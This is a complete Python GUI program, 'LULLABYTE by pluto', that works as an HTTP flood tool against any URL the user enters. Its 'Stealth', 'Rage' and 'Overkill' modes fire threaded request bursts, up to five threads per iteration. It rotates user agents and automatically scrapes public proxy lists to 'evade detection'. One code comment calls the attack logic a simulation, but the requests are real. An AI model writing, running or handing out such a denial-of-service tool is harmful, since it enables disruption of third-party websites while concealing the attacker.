import sys
import requests
import random
import threading
from datetime import datetime
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QWidget, QLabel,
    QLineEdit, QPushButton, QTextEdit, QCheckBox, QSpacerItem,
    QSizePolicy, QComboBox, QProgressBar, QHBoxLayout
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QIcon, QColor

# --- configuration & colors (pink theme) ---
COLOR_BACKGROUND = "#1a0b14"       # dark pink/black background
COLOR_FOREGROUND_MAIN_WINDOW = "#2d1b26" 
COLOR_LABELS_BORDERS = "#ffb3c7"   # soft pink
COLOR_INPUT_BACKGROUND = "#2d1b26" 
COLOR_INPUT_TEXT = "#ffb3c7"
COLOR_LOG_TEXT = "#ffcce0"         # light pink text
COLOR_BUTTON_BACKGROUND = "#4a2e38"
COLOR_BUTTON_TEXT = "#ffb3c7"
COLOR_BUTTON_BORDER = "#1a0b14"
COLOR_ERROR_BORDER = "#ff6699"     # hot pink

# --- assets & data ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36"
]

def scrape_proxies():
    """Fetches a list of HTTP proxies from various public lists."""
    proxy_sources = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://www.proxy-list.download/api/v1/get?type=http",
        # ... (adding a few more for robustness)
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"
    ]
    
    proxies = []
    for url in proxy_sources:
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                proxies.extend(response.text.strip().split('\n'))
        except requests.exceptions.RequestException:
            pass

    return list(set([p for p in proxies if p]))

class AttackThread(QThread):
    log_signal = pyqtSignal(str)
    update_progress = pyqtSignal(int)

    def __init__(self, url, num_requests, attack_mode, use_proxy):
        super().__init__()
        self.url = url
        self.num_requests = num_requests
        self.attack_mode = attack_mode
        self.use_proxy = use_proxy
        self.proxies = []
        self.running = True
        self.current_requests_sent = 0

    def run(self):
        self.log_signal.emit(" LULLABYTE ACTIVATED! TARGET LOCKED! \n")
        
        if self.use_proxy:
            self.log_signal.emit(" Fetching proxies for evasion...")
            self.proxies = scrape_proxies()
            if self.proxies:
                self.log_signal.emit(f" Found {len(self.proxies)} proxies.")
            else:
                self.log_signal.emit(" No proxies found. Proceeding without proxy support.")

        for i in range(self.num_requests):
            if not self.running:
                break

            try:
                headers = {"User-Agent": random.choice(USER_AGENTS)}
                proxy = None
                if self.use_proxy and self.proxies:
                    proxy = {"http": random.choice(self.proxies)}

                # attack logic simulation
                if self.attack_mode == "Stealth":
                    requests.get(self.url, headers=headers, proxies=proxy, timeout=5)
                elif self.attack_mode == "Rage":
                    threading.Thread(target=requests.get, args=(self.url,), kwargs={"headers": headers, "proxies": proxy, "timeout": 3}).start()
                elif self.attack_mode == "Overkill":
                    for _ in range(5):
                        threading.Thread(target=requests.get, args=(self.url,), kwargs={"headers": headers, "proxies": proxy, "timeout": 2}).start()

                self.current_requests_sent += 1
                log_msg = f"[{datetime.now().strftime('%H:%M:%S')}]  ATTACK #{self.current_requests_sent}/{self.num_requests} (MODE: {self.attack_mode})"
                self.log_signal.emit(log_msg)
                self.update_progress.emit(int((self.current_requests_sent / self.num_requests) * 100))

            except requests.exceptions.RequestException as e:
                self.log_signal.emit(f"[ERROR] Request {self.current_requests_sent} failed: {str(e)}")
            except Exception as e:
                self.log_signal.emit(f"[FATAL ERROR] An unexpected error occurred: {str(e)}")

        if self.running:
            self.log_signal.emit("\n LULLABYTE FINISHED. TARGET ELIMINATED. ")
        self.update_progress.emit(0)

    def stop(self):
        self.running = False
        self.log_signal.emit("\n LULLABYTE HALTED BY USER.")


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("LULLABYTE by pluto")
        self.setGeometry(200, 200, 750, 900)

        # main styling (pink theme)
        self.setStyleSheet(f"""
            QMainWindow {{
                background-color: {COLOR_BACKGROUND};
                color: {COLOR_LABELS_BORDERS};
                font-family: 'Courier New', monospace;
                font-weight: bold;
            }}
            QLabel {{
                color: {COLOR_LABELS_BORDERS};
                font-family: 'Courier New';
            }}
            QLineEdit, QComboBox, QTextEdit {{
                background-color: {COLOR_INPUT_BACKGROUND};
                color: {COLOR_INPUT_TEXT};
                border: 1px solid {COLOR_LABELS_BORDERS};
                padding: 5px;
                font-family: 'Courier New';
            }}
            QPushButton {{
                background-color: {COLOR_BUTTON_BACKGROUND};
                color: {COLOR_BUTTON_TEXT};
                font-weight: bold;
                border: 2px solid {COLOR_BUTTON_BORDER};
                padding: 8px 20px;
                border-radius: 4px; /* Slightly rounded for modern feel */
            }}
            QPushButton:hover {{
                background-color: {COLOR_LABELS_BORDERS};
                color: {COLOR_BACKGROUND};
            }}
            QPushButton:pressed {{
                background-color: {COLOR_BUTTON_BORDER};
            }}
            QCheckBox {{
                color: {COLOR_LABELS_BORDERS};
                font-family: 'Courier New';
            }}
            QProgressBar {{
                border: 1px solid {COLOR_LABELS_BORDERS};
                border-radius: 5px;
                text-align: center;
                background-color: {COLOR_INPUT_BACKGROUND};
                color: {COLOR_LOG_TEXT};
            }}
            QProgressBar::chunk {{
                background-color: {COLOR_LABELS_BORDERS};
                border-radius: 5px;
            }}
        """)

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout()

        # title
        title = QLabel("LULLABYTE")
        title.setAlignment(Qt.AlignCenter)
        title.setStyleSheet(f"font-size: 56px; color: {COLOR_LABELS_BORDERS}; text-shadow: 2px 2px 4px #ff6699;")
        layout.addWidget(title)

        # credit
        self.credit_label = QLabel("made by pluto")
        self.credit_label.setAlignment(Qt.AlignCenter)
        self.credit_label.setStyleSheet(f"color: {COLOR_LABELS_BORDERS}; font-size: 18px; text-shadow: 1px 1px 2px #ff6699;")
        layout.addWidget(self.credit_label, alignment=Qt.AlignCenter)

        # log output
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet(f"""
            background-color: {COLOR_INPUT_BACKGROUND};
            color: {COLOR_LOG_TEXT};
            border: 2px solid {COLOR_LABELS_BORDERS};
            font-size: 14px;
        """)
        layout.addWidget(self.log_output)


        # url input
        url_label = QLabel("TARGET URL:")
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("https://example.com")
        layout.addWidget(url_label)
        layout.addWidget(self.url_input)

        # requests input
        requests_label = QLabel("NUMBER OF REQUESTS:")
        self.requests_input = QLineEdit()
        self.requests_input.setPlaceholderText("10000")
        layout.addWidget(requests_label)
        layout.addWidget(self.requests_input)

        # mode selector
        mode_label = QLabel("ATTACK MODE:")
        self.mode_selector = QComboBox()
        self.mode_selector.addItems(["Stealth", "Rage", "Overkill"])
        layout.addWidget(mode_label)
        layout.addWidget(self.mode_selector)

        # proxy checkbox
        self.use_proxy = QCheckBox("AUTO-FETCH PROXIES (Evade Detection)")
        self.use_proxy.setChecked(True)
        layout.addWidget(self.use_proxy)

        # progress bar
        self.progress_bar = QProgressBar()
        self.progress_bar.setValue(0)
        layout.addWidget(self.progress_bar)

        # buttons
        btn_layout = QHBoxLayout()
        
        self.start_button = QPushButton("LAUNCH LULLABYTE")
        self.start_button.clicked.connect(self.start_attack)
        btn_layout.addWidget(self.start_button)

        self.stop_button = QPushButton("ABORT")
        self.stop_button.setEnabled(False)
        self.stop_button.clicked.connect(self.stop_attack)
        btn_layout.addWidget(self.stop_button)

        btn_container = QWidget()
        btn_container.setLayout(btn_layout)
        layout.addWidget(btn_container, alignment=Qt.AlignCenter)

        central_widget.setLayout(layout)
        self.attack_thread = None

    def log_message(self, message):
        self.log_output.append(message)
        self.log_output.ensureCursorVisible()

    def start_attack(self):
        url = self.url_input.text().strip()
        num_requests_str = self.requests_input.text().strip()

        if not (url.startswith("http://") or url.startswith("https://")):
            self.log_message(" ENTER A VALID TARGET URL (e.g., https://example.com)!")
            return

        if not num_requests_str.isdigit() or int(num_requests_str) <= 0:
            self.log_message(" INVALID REQUEST COUNT! Please enter a positive number.")
            return

        num_requests = int(num_requests_str)
        attack_mode = self.mode_selector.currentText()
        use_proxy = self.use_proxy.isChecked()

        # ui state updates
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.url_input.setEnabled(False)
        self.requests_input.setEnabled(False)
        self.mode_selector.setEnabled(False)
        self.use_proxy.setEnabled(False)

        self.progress_bar.setValue(0)
        self.log_output.clear()
        self.log_message(" Launching LULLABYTE ...")

        self.attack_thread = AttackThread(url, num_requests, attack_mode, use_proxy)
        self.attack_thread.log_signal.connect(self.log_message)
        self.attack_thread.update_progress.connect(self.progress_bar.setValue)
        self.attack_thread.start()

    def stop_attack(self):
        if self.attack_thread and self.attack_thread.isRunning():
            self.attack_thread.stop()
            self.attack_thread.wait()

        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.url_input.setEnabled(True)
        self.requests_input.setEnabled(True)
        self.mode_selector.setEnabled(True)
        self.use_proxy.setEnabled(True)
        self.progress_bar.setValue(0)
        self.log_message("LULLABYTE stopped.")


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())
